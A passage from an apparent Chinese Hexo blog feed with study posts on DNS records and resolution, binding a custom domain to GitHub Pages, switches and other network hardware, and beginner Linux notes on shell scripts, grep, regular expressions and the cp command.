<p>基站收集的通信请求被汇集到控制中心（“边缘网络”），之后再被接入到主干网。</p>
<p>如果是从一个信息发布者的角度来看的话，对于那些巨大的访问量，会采用数据中心的模式，也就是托管主机服务，集合多个存储一起，通过连接高速网络减少网络延迟来提高响应的速度。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/F541EB6888B188542B78B59340633E86.png" alt="F541EB6888B188542B78B59340633E86.png" title="" class="">
                <p>F541EB6888B188542B78B59340633E86.png</p>
            </figure>
<p>数据中心由大型服务器、存储和计算机网络构成，有些大型数据中心会直接连接主干网，就算小规模的议案也会连接到边缘网络。</p>
<p>数据中心的内部分布着三层交换机和高速路由器。</p>
]]></content>
      
        <categories>
            
            <category> OSI模型 网络构成要素 地址 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> TCP/IP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DNS相关]]></title>
      <url>/2017/08/16/DNS%E7%9B%B8%E5%85%B3/</url>
      <content type="html"><![CDATA[<p>为了让自己的博客开启友言评论…绑定域名的时候顺便了解了一下<br><a id="more"></a></p>
<h1 id="DNS相关"><a href="#DNS相关" class="headerlink" title="DNS相关"></a>DNS相关</h1><h2 id="什么是DNS？"><a href="#什么是DNS？" class="headerlink" title="什么是DNS？"></a>什么是DNS？</h2><p>网域名称系统（Domain Name System）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够让人更方便访问互联网。DNS使用TCP、UDP，端口53.当前对于每一级域名长度的限制是63的字符，总长不能超过253个字符。</p>
<h2 id="记录类型"><a href="#记录类型" class="headerlink" title="记录类型"></a>记录类型</h2><ul>
<li>主机记录（A记录）：用来指定主机名对应的IP地址记录，用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的二级域名。</li>
<li>别名记录（CNAME）：这种记录允许你将多个名字映射到同一台计算机，通常用于同时提供WWW和MAIL服务的计算机。同样也可以应用到多个域名指向同一个服务器的IP，此时将一个域名做A记录指向服务器，其他的域名作别名（CNAME）到A记录的域名上，当服务器IP变更时，只需要修改A记录即可。</li>
<li>IPv6主机记录（AAAA记录）：将特定的主机名映射到一个主机的IPv6地址</li>
<li>服务位置记录（SRV记录）：用于定义提供特定服务的服务器的位置，如主机（hostname），端口（port number）等。</li>
<li>NAPTR记录：NAPTR是以<a href="https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D%E5%8F%91%E8%B5%B7%E5%8D%8F%E8%AE%AE" target="_blank" rel="external">SIP</a>为基础，泛化了对传输协议有要求的服务,它提供了正则表达式的方式去映射一个域名</li>
</ul>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>DNS的查询有两种方式：递归、迭代。DNS客户端设置使用的DNS服务器一般都是递归服务器，它负责全权处理客户端的DNS查询请求，直到返回最终结果。DNS服务器之间一般采用的都是迭代查询的方式。</p>
<p>如果小明在浏览器中输入一段网址回车，域名解析过程如下： </p>
<ol>
<li>DNS 进程先检查自己的程序缓存（Cache），如果有”xxxx.com”所对应的 IP，则直接告诉浏览器。如果缓存没有找到，进入下一步；</li>
<li>检查本地 Host 文件，看看有没有，有则告诉浏览器。如果 Host 没有找到，进入下一步；</li>
<li>检查本地的 DNS 服务器配置，得到 DNS Server = 10.10.10.10，发个消息给它，让 DNS 服务器帮助查找。此消息为 UDP 格式，目的 IP=10.10.10.10，小明电脑发现和自己不在一个网段，于是使用上一节提到的不同网段的通信，将 IP 包发给 DNS Server = 10.10.1 […]</li>
<li>DNS Server （10.10.10.10）在自己的缓存里也没有发现，于是向互联网的上级 DNS Server （8.8.8.8）发送协查请求；DNS Server （8.8.8.8）发现了匹配项：HTTP://www.myorange.com2.2.2.2，于是将协查结果返回给小明公司 DNS 服务器（10.10.10.10），然后再返回到小明电脑（10.1.1.2）DNS 进程。（如果上层服务器也没有找到，就继续向上迭代查找）</li>
</ol>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-15%20%E4%B8%8B%E5%8D%883.01.29.png" alt="屏幕快照 2017-10-15 下午3.01.29.png" title="" class="">
                <p>屏幕快照 2017-10-15 下午3.01.29.png</p>
            </figure>
<p>这个时候，整个DNS解析的过程就完毕了,小明可以将访问服务器的请求打包成http格式之后告诉TCP进程，同时告诉TCP进程的还有该域名的IP地址。</p>
<h2 id="其他相关"><a href="#其他相关" class="headerlink" title="其他相关"></a>其他相关</h2><h3 id="国际化域名"><a href="#国际化域名" class="headerlink" title="国际化域名"></a>国际化域名</h3><p><strong>Punycode</strong>是一个根据RFC 3492标准而制定的编码系统，主要用于把域名从地方语言所采用的<code>Unicode</code>编码转换成为可用于DNS系统的编码。而该编码是根据<a href="http://www.iana.org/domains/idn-tables/" target="_blank" rel="external">域名相异字表</a>（由<a href="https://zh.wikipedia.org/wiki/IANA" target="_blank" rel="external">IANA</a>制定），Punycode可以防止所谓的<a href="https://zh.wikipedia.org/wiki/IDN%E6%AC%BA%E9%A8%99" target="_blank" rel="external">IDN欺骗</a>。</p>
<h3 id="TTL值"><a href="#TTL值" class="headerlink" title="TTL值"></a>TTL值</h3><p>全称是Time To Live，就是DNS记录在DNS服务器上的缓存时间。实质上也就是当TTL值过期之后，又要重复记录老化之后的域名解析过程了,这个值其实并不是固定的，在不同情况下是不同的。</p>
<h3 id="关于hexo博客重新关联域名"><a href="#关于hexo博客重新关联域名" class="headerlink" title="关于hexo博客重新关联域名"></a>关于hexo博客重新关联域名</h3><p>相信大部分初次搭建hexo博客的人都会选择使用github的那个免费域名,但是时间一久真的很丑的说….所以一定拥有一个自己的个性域名啊，那么基本上分为下面的三步就可以搞定了（以腾讯云为例，默默为被嫌弃的github默哀3秒）</p>
<ul>
<li>购买一个域名，可以使用GoDaddy或者国内一些信得过的，我是因为优惠劵的缘故所以选了腾讯云…并且免费选了大天朝的cn域名，虽然审核很麻烦🐸的说。</li>
<li>然后在云解析界面将我们的github添加到CNAME中去，将新买的域名指向原来的github域名，主机记录选择@，也就是直接解析主机名,如下图所示：</li>
</ul>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-16%20%E4%B8%8B%E5%8D%882.18.46.png" alt="屏幕快照 2017-08-16 下午2.18.46.png" title="" class="">
                <p>屏幕快照 2017-08-16 下午2.18.46.png</p>
            </figure>
<ul>
<li>这个时候还没有结束，只在域名商处修改CNAME之后，输入的域名会被重定向到Github pages的页面，但是由于你这个域名github不知道，所以直接就果断拒绝并且给一你巴掌，上面写着404，所以还是乖乖的把名字告诉他：在<code>你博客的本地目录/source/</code>目录下创建一个CNAME文件，里面写上你买的域名，然后就可以推送了：</li>
</ul>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-16%20%E4%B8%8B%E5%8D%882.27.26.png" alt="屏幕快照 2017-08-16 下午2.27.26.png" title="" class="">
                <p>屏幕快照 2017-08-16 下午2.27.26.png</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo g -d</div></pre></td></tr></table></figure>
<h4 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h4><ul>
<li><a href="http://blog.zfan.me/2015/09/03/%E4%B8%BA%E9%83%A8%E7%BD%B2%E5%9C%A8Github%E4%B8%8A%E7%9A%84Hexo%E5%8D%9A%E5%AE%A2%E7%BB%91%E5%AE%9A%E4%B8%AA%E6%80%A7%E5%9F%9F%E5%90%8D/" target="_blank" rel="external">参考博客</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> github博客绑定个性域名 域名记录类型、解析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> TCP/IP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[计算机网络硬件]]></title>
      <url>/2017/08/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%A1%AC%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p>emmmm…..先写这么多，有兴趣以后再写，作为开发人员对于网络层以下只是了解<br><a id="more"></a></p>
<h1 id="计算机网络硬件-待补充"><a href="#计算机网络硬件-待补充" class="headerlink" title="计算机网络硬件(待补充)"></a>计算机网络硬件(待补充)</h1><h2 id="中继器和网桥"><a href="#中继器和网桥" class="headerlink" title="中继器和网桥"></a>中继器和网桥</h2><p>数据链路层中多个网段互联的功能实体称作桥或者网桥。通过网桥进行的数据发送则称为桥接过程。</p>
<h3 id="中继器："><a href="#中继器：" class="headerlink" title="中继器："></a><a href="https://baike.baidu.com/item/%E4%B8%AD%E7%BB%A7%E5%99%A8" target="_blank" rel="external">中继器</a>：</h3><p>中继器是一种信号增强装置，在OSI第一层模型上运行，也就是物理层，因此中继器无法辨别数据链路层中的MAC地址以及网络层中的IP地址。中继器将由电缆传过来的电信号和光信号经由中继器的波形调整和放大之后再传给另一个电缆，这中间，中继器只是在0、1比特流之间的替换，并不判断数据是否有错误。</p>
<p>有的中继器可以提供多个端口，这样的中继器被称作中继集线器或者集线器。</p>
<h3 id="网桥"><a href="#网桥" class="headerlink" title="网桥"></a><a href="https://baike.baidu.com/item/%E7%BD%91%E6%A1%A5" target="_blank" rel="external">网桥</a></h3><p>通过两个接口连接两个冲突域的装置称作网桥。网桥的作用相当于OSI模型中的数据链路层，目前经常使用的交换机也就是多端口透明网桥。</p>
<h3 id="共享式集线器"><a href="#共享式集线器" class="headerlink" title="共享式集线器"></a>共享式集线器</h3><p>带有中继器功能的集线器也可以称作共享式集线器，在OSI模型中处于数据链路层，价格便宜是他最大的优势，但由于集线器属于共享型设备，导致在网络中效率比较低下。</p>
<p>在共享带宽的时候，网络中每一个终端能否发送数据都将采用CSMA/CD方式来决定。这个决定方式首先判断的是在通信链路上有没有别的终端在发送数据，如果数据链路空闲，就开始发送数据，如果在使用，则需要继续等待，因此通信效率很低。</p>
<h3 id="交换式集线器"><a href="#交换式集线器" class="headerlink" title="交换式集线器"></a>交换式集线器</h3><p>交换式集线器是指将两个通信终端在两个端口在装置内部绑定，使其他端口的信号无法介入，从而防止发生冲突，弥补了共享式集线器的不足点，在共享式集线器，从发送方接收到的数据会直接转发到所有的非发送方端口，也就是单纯的复制电气信号。</p>
<p>但是交换式集线器则通过学习连接到每个终端的MAC地址，将数据仅发送到发送方所期望的目标终端上去，避免了将数据发送到无关端口，提高了网络利用率。</p>
<p>如果在学习MAC地址之前遇到的发送目的地不明，或者想对网段内所有的终端进行通信的时候，就会采用广播的方式，就像共享式集线器一样，将数据发送到所有非发送方的端口。</p>
<h3 id="学习MAC地址交换机"><a href="#学习MAC地址交换机" class="headerlink" title="学习MAC地址交换机"></a>学习MAC地址交换机</h3><p>通过确认以太网数据帧的发送源MAC地址，习得交换机端口号和该端口所连硬件的MAC地址配对信息，并将该信息注册到其内部的MAC地址表中。　</p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/EF3193095D5EAD01A4B7CDE9CFDEF961.png" alt="EF3193095D5EAD01A4B7CDE9CFDEF961.png"></p>
<p>这个时候就有一个问题，如果MAC地址表的记录信息一直保留的话，当连接端口的设备发生变化时，就会出现实际情况和表中的数据无法对应的情况，因此就会给MAC地址表的表项设置一个超时值，也称作MAC地址的老化时间，在思科公司的交换机中这个值默认是5分钟，交换机会根据该值对MAC地址表中的记录项进行老化消去。</p>
<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><h3 id="第一台交换机的诞生"><a href="#第一台交换机的诞生" class="headerlink" title="第一台交换机的诞生"></a>第一台交换机的诞生</h3><p>在20世纪80年代，很多企业开始察觉到使用共享集线器构成的LAN性能很差，便逐步开始使用能够分割冲突域的以太网网桥设备。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/E388BB28527BFF9AA4EFC930BC4182AE.png" alt="E388BB28527BFF9AA4EFC930BC4182AE.png" title="" class="">
                <p>E388BB28527BFF9AA4EFC930BC4182AE.png</p>
            </figure>
<p>1990年，Kalpana公司发售了世界上首台交换机产品EthertSwitch(上图)，在此之前，普通的<a href="https://zh.wikipedia.org/wiki/%E6%A9%8B%E6%8E%A5%E5%99%A8" target="_blank" rel="external">存储转发型网桥装置</a>只有两个端口，而EtherSwitch拥有7个端口。在此之后，拥有多个端口的以太网交换机这个概念才逐渐被人们所接受。由于当时的EtherSwitch没有实现IEEE规定的相关标准，不能称之为网桥，所以使用了交换机一词。</p>
<p>后来随着发展。这类技术使网桥内部的部分组处理的通信延迟降低了10微秒左右，而且可以在性能无损的前提下桥接多个端口。这个时候也是以太网交换机作为网络技术术语被推广起来的时候。</p>
<h3 id="交换机使用的数据帧及其传输方式"><a href="#交换机使用的数据帧及其传输方式" class="headerlink" title="交换机使用的数据帧及其传输方式"></a>交换机使用的数据帧及其传输方式</h3><p>1.交换机使用的数据帧类型：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/B26A7AC70B5AC1CEA230F50194A18FBF.png" alt="B26A7AC70B5AC1CEA230F50194A18FBF.png" title="" class="">
                <p>B26A7AC70B5AC1CEA230F50194A18FBF.png</p>
            </figure>
<p>2.交换机数据帧的传输方式</p>
<p>交换机从接受以太网数据帧到发送新的以太网数据帧，这之间有三种处理方式：直通转发、碎片隔离、存储转发</p>
<blockquote>
<p>直通转发</p>
</blockquote>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/061ADA965889BF9EED07A85A2B8BAB80.png" alt="061ADA965889BF9EED07A85A2B8BAB80.png" title="" class="">
                <p>061ADA965889BF9EED07A85A2B8BAB80.png</p>
            </figure>
<p>交换设备只需要读取数据帧的前14个字节，便可将数据帧发送至目的地，这样尽管延时很低， 但是通信的发送方和接收方要求以一致的速度来完成数据帧的发送和接收，这会导致无法将普通的以太网桥接到不同速率的快速以太网。另外接收方在瘦到数据帧的时候，只读取了前14个字节，跳过了数据帧尾部的FCS域，无法检测并<code>及时</code>的丢弃发生CRC校验错误的数据帧。（直通转发很少单独使用，有时会和碎片隔离交换等结合使用）</p>
<blockquote>
<p>碎片隔离</p>
</blockquote>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/1E6C28E94D18919F0B9A7597C32EAB13.png" alt="1E6C28E94D18919F0B9A7597C32EAB13.png" title="" class="">
                <p>1E6C28E94D18919F0B9A7597C32EAB13.png</p>
            </figure>
<p>这种方法就防止了冲突时转发残帧，在以太网中发生的通信错误大多由于冲突产生，因此碎片隔离缺失可以回避大多数错误，但是这种方式也不会读取到FCS域，所以数据帧出现CRC校验错误时，就只能想直通转发的方式一样去处理。碎片隔离和直通转发一样都是采用先进先出的方式处理数据帧，但同样通信速度不同的以太网之间无法进行桥接，目前也几乎不再使用。</p>
<blockquote>
<p>存储转发</p>
</blockquote>
<p>存储转发会读取数据帧的所有内容再进行转发，这样就能识别所有的错误帧，并及时的将它们丢弃。另外设备还可以对所有的数据帧进行缓存操作，重新生成信号作为一个完全相同的数据帧发往另一个网段，因此还可以完成不同速率的以太网段桥接工作，缺点就是通信延迟比较大。</p>
<blockquote>
<p>交换机数据帧交换方式比较</p>
</blockquote>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/197F80A2DC28C4EE68995E2F81EB0B45.png" alt="197F80A2DC28C4EE68995E2F81EB0B45.png" title="" class="">
                <p>197F80A2DC28C4EE68995E2F81EB0B45.png</p>
            </figure>
<blockquote>
<p>自适应交换</p>
</blockquote>
<p>根据用户的设置，当残帧和CRC错误帧的数量超过一定值的时候，能够自动变更为其他传输数据帧方式的方式，叫做自适应交换或自适应直通转发。</p>
<p>使用该方式时，通常采用直通转发传输数据帧，当错误帧累计至一定数目的时候，就转换为存储转发，错误帧的数量减少后，再切换回直通转发，这样做的目的是将传输的错误帧数量和通信时延降到最低。</p>
<h3 id="全双工和半双工"><a href="#全双工和半双工" class="headerlink" title="全双工和半双工"></a>全双工和半双工</h3><p> 半双工是只发送或只接受的通信方式。它类似于无线电收发器，若两端同时说话，是听不到对方说话的。而全双工不同，它允许在同一时间既可以发送数据也可以接受数据。类似于电话。</p>
<h4 id="半双工"><a href="#半双工" class="headerlink" title="半双工"></a>半双工</h4><p>采用CSMA/CD（载波监听多路访问，共享介质型网络的一种控制方式–争用方式，还有一种为令牌传递）方式的以太网，首先要判断是否可以通信，如果可以就独占整个通信线路。因此，就像无线收发器一样，不能同时传输和接收数据</p>
<h4 id="全双工"><a href="#全双工" class="headerlink" title="全双工"></a>全双工</h4><p>同样是以太网，在使用交换机和双绞线电缆（或者光纤）的情况下，既可以通过交换机的端口与计算机之间进行一对一的连接，也可以通过相连电缆内部的收发线路分别进行接收和发送数据。因此。交换机端口和计算机之间可以进行全双工通信。</p>
<h3 id="路由器-三层交换机"><a href="#路由器-三层交换机" class="headerlink" title="路由器/三层交换机"></a>路由器/三层交换机</h3><p>路由器是在OSI模型的第三层上—网络层面连接两个网络，并对分组报文进行转发的设备，网桥是根据MAC地址进行处理，而路由器是根据IP地址进行处理。</p>
<p>路由器可以连接不同的数据链路，连接两个以太网或者一个以太网和一个FDDI。除此之外，路由器还有分担网络负荷的作用，有些路由器甚至具备一定的网络安全功能。</p>
<h3 id="4～7层交换机"><a href="#4～7层交换机" class="headerlink" title="4～7层交换机"></a>4～7层交换机</h3><p>4～7层交换机负责处理OSI模型中从传输层到应用层的数据。</p>
<p>如果是从协议的角度上来说的话，就是从TCP协议往上的到邮件互发协议，远程登录协议等等。</p>
<p>而其用途也是十分的广泛，比如对于一个并发访问量非常大的企业级站点，使用一台服务器不足以满足前端的需求，通常会架设多台服务器来分担。这些服务器前端访问的入口只有一个，所以为了把通过同一个url的访问分发到后台的多个服务器上，可以在这些服务器的前端加在一个负载均衡器。这种负载均衡器就是4～7层交换机的一种，当然也可以通过循环复用DNS的方式来实现。</p>
<p>同时它还有一个重要的功能就是带宽控制，比如有时候我们需要优先处理语音这种紧急通信请求，而邮件这种稍有延迟也并无大碍。</p>
<p>除此之外，广域网加速器、特殊应用访问加速、防火墙中也有它的身影。</p>
]]></content>
      
        <categories>
            
            <category> 交换机和集线器 数据帧的发送 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序员的自我修养 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux运维学习Day5]]></title>
      <url>/2017/08/15/Linux%E8%BF%90%E7%BB%B4%E5%AD%A6%E4%B9%A0Day5/</url>
      <content type="html"><![CDATA[<p>开始学习繁琐的文本处理工具和头疼的正则表达式了<br><a id="more"></a></p>
<h1 id="Linux运维学习Day5"><a href="#Linux运维学习Day5" class="headerlink" title="Linux运维学习Day5"></a>Linux运维学习Day5</h1><h2 id="SHEll编程"><a href="#SHEll编程" class="headerlink" title="SHEll编程"></a>SHEll编程</h2><h3 id="1-提供了编程环境"><a href="#1-提供了编程环境" class="headerlink" title="1.提供了编程环境"></a>1.提供了编程环境</h3><p>程序设计风格：</p>
<p>​    过程式：以指令为中心，数据服务于指令</p>
<p>​    对象式：以数据为中心，指令服务于数据</p>
<p>shell程序：提供了编程能力，解释执行</p>
<p>程序的执行方式：</p>
<p>​    低级：汇编</p>
<p>​    高级：</p>
<p>​        编译：高级语言—》编译器—》目标代码</p>
<p>​        C，C++，java</p>
<p>​        解释：高级语言—》解释器—》机器代码</p>
<p>​        shell, perl,python</p>
<p>shell脚本，文本文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#! /bin/zsh</div><div class="line"></div><div class="line">cat /etc/fstab</div><div class="line"></div><div class="line">wc -l /etc/fstab</div></pre></td></tr></table></figure>
<p>运行脚本的方式：</p>
<p>1.给予指定的权限，通过具体的文件路径指定文件执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./first.sh</div></pre></td></tr></table></figure>
<p>2.直接运行解释器，将脚本作为解释器程序的参数运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">zsh first.sh</div></pre></td></tr></table></figure>
<p>在bash中，把所有要存储的数据统统当作字符进行，不支持浮点数。</p>
<h3 id="2-短路运算"><a href="#2-短路运算" class="headerlink" title="2.短路运算"></a>2.短路运算</h3><p>与：</p>
<p>​    第一个为0，结果必定为0</p>
<p>​    第一个为1，第二个必须要参与运算</p>
<p>或：</p>
<p>​    第一个为1，结果必定为1</p>
<p>​    第一个为0，第二个必须要参与运算</p>
<p>可以通过命令的执行状态码来举个例子：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-31%20%E4%B8%8B%E5%8D%883.40.18.png" alt="屏幕快照 2017-07-31 下午3.40.18.png" title="" class="">
                <p>屏幕快照 2017-07-31 下午3.40.18.png</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#可以通过下面这种方式来模拟判断命令的输出成功与否</div><div class="line">ls /var &amp;&amp; echo &quot;success&quot; || echo &quot;failed&quot;</div><div class="line">id root &amp;&gt; /dev/null &amp;&amp; echo &quot;exist&quot; || echo &quot;no such user&quot;</div></pre></td></tr></table></figure>
<h2 id="Linux上的文本处理三剑客"><a href="#Linux上的文本处理三剑客" class="headerlink" title="Linux上的文本处理三剑客"></a>Linux上的文本处理三剑客</h2><p>1.grep:文本过滤（模式：pattern）工具</p>
<p>​    grep、egrep、fgrep</p>
<p>2.sed:stream editor ,文本编辑工具</p>
<p>3.awk:Linux上的实现gawk,文本报告生成器</p>
<h3 id="grep："><a href="#grep：" class="headerlink" title="grep："></a>grep：</h3><p>全称是（Global search Regular expression and Print out the line）</p>
<p>作用：文本搜索工具，根据用户指定的模式对目标文本进行逐行匹配检查，打印匹配到的行</p>
<p>​    模式：由正则表达式字符及文本字符所编写的过滤条件</p>
<p>​    REGEXP:有一类特殊字符及文本字符所编写的模式，其中有些字符不代表字符字面意思，而表示控制或通配的功能    </p>
<p>​        基本正则表达式（BRE）</p>
<p>​        扩展正则表达式（ERE）</p>
<p>​            grep -E 、egrep    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">grep root /etc/passwd</div><div class="line">grep --color=auto root /etc/passwd #表示对匹配到的文本着色显示</div><div class="line">fgrep root /etc/passwd.   #固化表达式的搜索，其中的$...没有转义的意义，只是匹配原字符串</div><div class="line">grep -v root /etc/passwd  #显示无法被匹配到的行</div><div class="line">grep -i root /etc/passwd  #忽略字符的大小写</div><div class="line">grep -o root /etc/passed  #仅显示匹配到的字符串</div><div class="line">grep -q root /etc/passwd  #没有回显，被称作静默模式</div><div class="line">#此外还有-A/B/C + n，除匹配到的信息之外，还显示匹配到的信息的后／前／前后n行</div></pre></td></tr></table></figure>
<p> 基本正则表达式元字符：</p>
<p>​    字符匹配：</p>
<table>
<thead>
<tr>
<th>.</th>
<th>匹配任意的单个字符</th>
</tr>
</thead>
<tbody>
<tr>
<td>[]</td>
<td>匹配指定范围内的任意的单个字符</td>
</tr>
<tr>
<td>[^]</td>
<td>匹配指定范围外的任意单个字符</td>
</tr>
<tr>
<td>[:alpha:]…</td>
<td>通配符中的专用字符集合也是一样的用法</td>
</tr>
</tbody>
</table>
<p>​    匹配次数：用在要指定次数的字符后面，用于指定前面的字符要出现的次数（使用的时候加引号）</p>
<table>
<thead>
<tr>
<th>*</th>
<th>匹配前面的字符任意次</th>
</tr>
</thead>
<tbody>
<tr>
<td>.*</td>
<td>任意长度的任意字符，和glob中的*具有相同的意义</td>
</tr>
<tr>
<td>\?</td>
<td>匹配前面的字符0或1次，即前面的可有可无</td>
</tr>
<tr>
<td>\ +</td>
<td>匹配其前面的字符至少一次</td>
</tr>
<tr>
<td>\ {m\ }</td>
<td>匹配前面的字符m次，如果在m后面加个逗号，则表示至少m次0</td>
</tr>
<tr>
<td>\ {m , n\ }</td>
<td>匹配前面的字符至少m次，至多n次</td>
</tr>
</tbody>
</table>
<p>​    位置锁定：</p>
<table>
<thead>
<tr>
<th>^</th>
<th>行首锁定，用于模式最左侧</th>
</tr>
</thead>
<tbody>
<tr>
<td>$</td>
<td>行尾锁定，用于模式最右侧</td>
</tr>
<tr>
<td>^…$</td>
<td>用于模式匹配整行</td>
</tr>
<tr>
<td>^$</td>
<td>空行</td>
</tr>
<tr>
<td>\ &lt;</td>
<td>词首绑定，用于单词模式的左侧</td>
</tr>
<tr>
<td>\ &gt;</td>
<td>词尾绑定，用于单词模式的右侧</td>
</tr>
</tbody>
</table>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-08-01%20%E4%B8%8B%E5%8D%888.01.32.png" alt="屏幕快照 2017-08-01 下午8.01.32.png" title="" class="">
                <p>屏幕快照 2017-08-01 下午8.01.32.png</p>
            </figure> 
<p>​    分组：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">\(\):将一个或多个字符捆绑在一起，当作一个整体进行处理</div><div class="line">#分组括号中的模式匹配到的内容会被正则表达式引擎记录于内部的变量后，这些变量的命名方式为：\1,\2</div><div class="line"> \1:从左侧起，第一个左括号以及与之匹配右括号之间的模式所匹配到的字符,剩下的依次类推：</div><div class="line"> 	\(ab\+\(xy\)*\):</div><div class="line"> 	\1:ab\+(xy\)*\</div><div class="line"> 	\2:xy</div><div class="line">#后向引用：引用前面的分组括号中的模式所匹配字符（而非模式本身）</div></pre></td></tr></table></figure>
<p>例题训练：</p>
<p>1.如果用户root存在，显示其默认的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id root &amp;&gt; /dev/null &amp;&amp; grep &apos;^root\&gt;&apos; /etc/passwd | cut -d: -f7</div></pre></td></tr></table></figure>
<p>2.找出/etc/passwd中的两位或三位数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep &apos;\&lt;[0-9]\&#123;2,3\&#125;\&gt;&apos; /etc/passwd</div></pre></td></tr></table></figure>
<p>3.找出/etc/passwd文件中用户名同shell名的行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep &apos;\(^[[:alnum:]]\+\&gt;\).*\1$&apos; /etc/passwd</div></pre></td></tr></table></figure>
<p>4.写一个脚本执行一下功能：</p>
<p>如果user1存在，就显示其存在，否则就添加，并显示添加用户的id号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#! /bin/bash</div><div class="line">id user1 &amp;&gt; /dev/null &amp;&amp; echo &apos;user1 exist&apos; || useradd user1 &amp;&amp; id user1</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Linux下的文本处理三剑客 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux运维学习Day4]]></title>
      <url>/2017/08/15/Linux%E8%BF%90%E7%BB%B4%E5%AD%A6%E4%B9%A0Day4/</url>
      <content type="html"><![CDATA[<p>管道和重定向都是经常用到的操作，权限的理解对于我们后续的学习也是很有帮助的</p>
<a id="more"></a>
<h1 id="Linux运维学习Day4"><a href="#Linux运维学习Day4" class="headerlink" title="Linux运维学习Day4"></a>Linux运维学习Day4</h1><h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h3 id="cp命令："><a href="#cp命令：" class="headerlink" title="cp命令："></a>cp命令：</h3><p><strong>cp SRC DEST(src是单个文件)</strong></p>
<p>1.如果目标不存在，新建DEST，并将SRC中的内容填充进去</p>
<p>2.如果目标存在：</p>
<p>如果是文件，就会将原内容覆盖，最好使用选项<code>-i</code>（交互式，避免误操作）</p>
<p>如果是目录，就新建一个和原文件同名的文件，然后将内容填充进去</p>
<p><strong>cp SRC… DEST(src是多个文件)</strong></p>
<p>这个时候DEST必须存在且为目录，其他情况均会出错</p>
<p><strong>cp SRC DEST(src是目录)</strong></p>
<p>这个时候要使用选项<code>-r</code></p>
<p>1.如果目标不存在，创建指定的目录，复制SRC目录中所有的文件至DEST中</p>
<p>2.如果目标存在，if是文件，直接报错，if是目录，直接将SRC目录中的文件复制过去</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/B9F4B48A32282207CA2513049D5FE217.jpg" alt="B9F4B48A32282207CA2513049D5FE217.jpg" title="" class="">
                <p>B9F4B48A32282207CA2513049D5FE217.jpg</p>
            </figure>
<p>其中<code>--preserve选项太长了</code>，可以写为<code>-p</code>,<code>-v</code>选项用来显示过程，不必多说</p>
<h3 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h3><p><strong>mv SRC DEST</strong></p>
